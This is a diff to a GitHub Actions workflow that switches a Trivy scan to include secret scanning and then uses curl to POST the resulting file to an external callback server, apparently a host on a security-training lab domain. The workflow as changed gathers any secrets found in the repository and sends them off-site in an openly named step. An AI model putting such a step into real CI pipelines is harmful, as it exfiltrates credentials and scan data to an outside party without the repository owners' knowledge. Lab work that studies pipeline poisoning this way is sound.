@@ -19,16 +19,16 @@ jobs:
     - name: Run Trivy config scan
       continue-on-error: true
       run: |
-          trivy config . --format json --output trivy-results.json
+          trivy fs . --scanners vuln,misconfig,secret > results.json
     - name: Upload SARIF as Artifact
       uses: actions/upload-artifact@v4
       with:
           name: trivy-report
-          path: trivy-results.sarif
+          path: results.json
           
     - name: Send Trivy report to external server
       run: |
-          curl -v -X POST -H "Content-Type: multipart/form-data" -F "file=@trivy-results.json" http://3rvz2umdy425l4q0hh4kj.appsecengineer.training:8880/callback
+          curl -v -X POST -H "Content-Type: multipart/form-data" -F "file=@results.json" http://3rvz2umdy425l4q0hh4kj.appsecengineer.training:8880/callback
 
     #- name: Run Trivy vulnerability scanner in repo mode
     #  uses: aquasecurity/trivy-action@master
